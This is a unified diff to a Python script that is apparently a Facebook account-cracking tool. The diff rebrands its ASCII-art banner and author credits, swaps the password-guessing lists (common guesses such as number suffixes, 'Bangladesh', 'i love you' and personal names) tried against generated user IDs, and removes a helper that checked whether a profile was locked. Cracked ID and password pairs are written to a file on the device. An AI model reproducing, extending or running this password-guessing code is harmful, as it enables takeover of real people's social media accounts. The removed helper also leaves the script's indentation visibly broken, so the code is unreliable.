@@ -139,18 +139,19 @@ def jalan(z):
 
 logo =("""\033[38;5;46m    
 
-  /$$$$$$  /$$$$$$$  /$$$$$$ /$$$$$$$ 
- /$$__  $$| $$__  $$|_  $$_/| $$__  $$
-| $$  \ $$| $$  \ $$  | $$  | $$  \ $$
-| $$$$$$$$| $$$$$$$   | $$  | $$$$$$$/
-| $$__  $$| $$__  $$  | $$  | $$__  $$
-| $$  | $$| $$  \ $$  | $$  | $$  \ $$
-| $$  | $$| $$$$$$$/ /$$$$$$| $$  | $$
-|__/  |__/|_______/ |______/|__/  |__/                                                                     
+              $$$$$$$\     $$$$$\ 
+              $$  __$$\    \__$$ |
+              $$ |  $$ |      $$ |
+              $$$$$$$  |      $$ |
+              $$  __$$< $$\   $$ |
+              $$ |  $$ |$$ |  $$ |
+              $$ |  $$ |\$$$$$$  |
+              \__|  \__| \______/ 
+                                                                                
                                       
-\033[41m \033[1;37m           [ABIR RAHMAN]               \x1b[0m
+\033[41m \033[1;37m           [RJ SHANTO]               \x1b[0m
 \033[1;32m   
-\033[1;33m [] Admin   : MD. ABEDUR RAHMAN\033[1;32m       
+\033[1;33m [] Admin   : SH AN TO\033[1;32m       
 \033[1;34m [] Github  :\033[41m\033[1;37mD4rK-B0y\x1b[0m                 
 \033[1;35m [] Whtsapp : 01863517***             
 \033[1;36m [] Youtube : \x1b[38;5;46mABID ALL HUB\x1b[1;97m                           
@@ -283,7 +284,7 @@ def virus2():
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','free fire']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'11',kode+'1122',kode+'123',kode+'1234',kode+'@',kode+'@@',kode+'@@@',kode+'@#','Bangladesh','i love you','hridoy','fatema','ma baba']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [ðŸ¤«] Crack process has been completed')
@@ -316,7 +317,7 @@ def virus3():
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','hridoy','sadiya','fatema']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','free fire']
 			yaari.submit(c,uid,pwx,tl)
 	print(50*'_')
 	print(' [ðŸ˜­] Crack process has been completed')
@@ -491,24 +492,6 @@ def c(uid,pwx,tl):
                 oks.append(cid)
                 open('/sdcard/LM-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 break
-                try:
-                    uid=reqx['uid']
-                except:
-                    uid=ids
-                    ckkx=lock_check(uid)
-                if ckkx=='LOCK':
-                    break
-                    #Lock show hobey na
-#-------checker------#
-    def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=bxx(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
             else:
                 continue
         loop+=1        
